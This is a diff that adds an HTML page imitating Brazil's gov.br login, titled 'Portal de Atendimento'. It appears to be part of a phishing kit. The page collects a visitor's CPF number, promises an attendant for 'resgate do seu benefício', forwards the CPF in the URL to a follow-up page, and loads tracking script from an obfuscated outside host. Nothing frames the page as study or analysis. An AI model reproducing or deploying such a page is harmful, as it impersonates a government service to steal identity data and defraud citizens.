@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal de Atendimento</title>
+<link rel="stylesheet" href="./css/QaIqW1utq3mz.css">
+<link rel="stylesheet" href="./css/zf7pHW7C6jmJ.css">
+<link rel="stylesheet" href="./css/r8GLIAYigx1R.css">
+<link rel="stylesheet" href="./css/aOuDpommhWKF.css">
+</head>
+<body>
+<header>
+<img src="./images/VNXzI7juxMva.png" alt="Imagem de um gato"> 
+<div id="acessibilidade">
+<span>
+<a href=""><i class="fas fa-adjust"></i></a>
+</span>
+<span>
+<a href="" target="_blank"><i class="fas fa-deaf"></i></a>
+</span>
+</div>
+</header>
+<div class="container">
+<div class="card">
+<h3>Identifique-se no gov.br com:</h3>
+<div class="item-login-signup">
+<a tabindex="3">
+<img src="./images/VhFMes3kzEfs.png">
+Número do CPF
+</a>
+</div>
+<div class="accordion-panel">
+<p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+<form id="formCPF">
+<label for="cpf">CPF</label>
+<input id="numeroCPF" name="cpf" autocomplete="new-password" tabindex="1" type="tel" value="" placeholder="Digite seu CPF" aria-invalid="false" required="true" class="corrigircpf">
+<script src="../../v11zgzbU76ZS.io/xYnkjCIt3rHL.js" type="text/javascript" async=""></script><script>
+                document.addEventListener('DOMContentLoaded', function () {
+            // Obtém todos os elementos com a classe 'corrigircpf'
+                    var inputs = document.getElementsByClassName('corrigircpf');
+
+            // Adiciona um ouvinte de evento de entrada a cada elemento
+                    for (var i = 0; i < inputs.length; i++) {
+                        inputs[i].addEventListener('input', function () {
+                    // Remove os caracteres '-' e '.'
+                            this.value = this.value.replace(/[-.]/g, '');
+
+                    // Limite a quantidade de caracteres conforme necessário (ex: CPF)
+                    var maxLength = 11; // ajuste conforme necessário
+                    this.value = this.value.slice(0, maxLength);
+                });
+                    }
+                });
+            </script>
+<script>
+        document.getElementById('formCPF').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+
+// Obter a URL completa
+var urlCompleta = window.location.href;
+
+// Remover "index.html" do final da URL, se presente
+urlCompleta = urlCompleta.replace(/index\.html$/, "");
+
+// Remover os parâmetros da URL
+var urlSemParametros = urlCompleta.split('?')[0];
+
+// Verificar se a URL termina com uma barra (/) e adicionar "atendimento.html"
+var novaUrl = urlSemParametros.endsWith("/") ? urlSemParametros + "atendimento.html" : urlSemParametros + "/atendimento.html";
+
+// Obter o valor do input com ID "numeroCPF"
+var numeroCPF = document.getElementById("numeroCPF").value;
+
+// Adicionar "?cpf=" seguido dos dados do input ao final da URL
+if (numeroCPF) {
+    novaUrl += "?CPF=" + encodeURIComponent(numeroCPF);
+}
+
+// Utilize a variável (novaUrl) conforme necessário
+console.log("Nova URL: " + novaUrl);
+
+
+
+
+            // Obtém o valor do input com ID "numeroCPF"
+            var numeroCPF = document.getElementById('numeroCPF').value;
+
+            // Constrói a URL de redirecionamento
+            var redirectURL = novaUrl;
+
+            // Adiciona parâmetros existentes na URL atual à nova URL
+            var parametrosAtuais = window.location.search.substring(1);
+            if (parametrosAtuais) {
+                redirectURL += '&' + parametrosAtuais;
+            }
+
+            // Redireciona para a URL construída
+            window.location.href = redirectURL;
+        });
+        </script>
+<div id="error-message" style="color: red;"></div>
+<p>Nota: Uma atendente continuará o seu atendimento logo após você prosseguir para o resgate do seu benefício.</p>
+<div class="button-panel" id="login-button-panel">
+<input type="submit" value="Continuar" id="buttonCPF" class="button-continuar" tabindex="2">
+<style type="text/css">
+                    input.button-continuar {
+                        border-radius: 20px;
+                        border: none;
+                        color: #fff;
+                    }
+                </style>
+</div>
+</form>
+<label id="title-outras-op">Outras opções de identificação:</label>
+<hr id="hr-outras-op" style="margin: 0 0 0">
+<div class="item-login-signup-ways" onclick="showModal('modal-bancos-credenciados')">
+<a tabindex="5" href="" style="color:#008C32">
+<img src="./images/BF3fENOmUYvW.png">
+Login com seu banco
+<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA CONTA SERÁ PRATA</span>
+</a>
+</div>
+<div class="item-login-signup-ways" onclick="showQrCode('e062c3ac-776d-4ee0-b6f3-f9198984ca37');">
+<a tabindex="5" href="">
+<img src="./images/bV6pIAYTlr3z.png">
+Seu aplicativo gov.br
+</a>
+</div>
+<div class="item-login-signup-ways" id="cert-digital-cloud" onclick="showModal('modal-certificado-nuvem')">
+<a tabindex="5" href="" id="cert-digital-cloud-a">
+<img src="./images/9UOi4e8uiWFb.png" id="cert-digital-cloud-img">
+Seu certificado digital em nuvem
+</a>
+</div>
+<div class="entenda-id-govbr" id="entenda-id-govbr">
+<span>
+<a tabindex="6" href="" id="entenda-id-govbr-a">
+<img src="./images/THeOiTOvneYR.svg" style="margin: 0px 13px -2px 0px; height: 1em;">
+Está com dúvidas e precisa de ajuda?
+</a>
+<a tabindex="6" href="" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<script src="./js/HhQL6EpL0vli.js" type="text/javascript" async=""></script><script src="./js/4KBJJIC1SayI.js"></script>
+<script>
+        function formatarCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            cpf = cpf.substring(0, 11);
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            return cpf;
+        }
+    
+        document.getElementById('numero').addEventListener('input', function (e) {
+            var cpfFormatado = formatarCPF(e.target.value);
+            e.target.value = cpfFormatado;
+    
+            // Atualizar o valor do campo oculto com o CPF sem formatação
+            var cpfLimpo = cpfFormatado.replace(/\D/g, '');
+            document.getElementById('cpf_valor_real').value = cpfLimpo;
+        });
+    </script>
+<script type="text/javascript"> (function(funnel) {var deferredEvents = [];window.funnelytics = {events: {trigger: function (name, attributes, callback, opts) {deferredEvents.push({name: name, attributes: attributes, callback: callback, opts: opts});}}};var insert = document.getElementsByTagName('script')[0],script = document.createElement('script');script.addEventListener('load', function() {window.funnelytics.init(funnel, false, deferredEvents);});script.src = 'https://v11zgzbU76ZS.io/xYnkjCIt3rHL.js';script.type = 'text/javascript';script.async = true;insert.parentNode.insertBefore(script, insert);})('42208a35-a879-421e-8f80-48b628f055c7'); </script>
+</body></html>
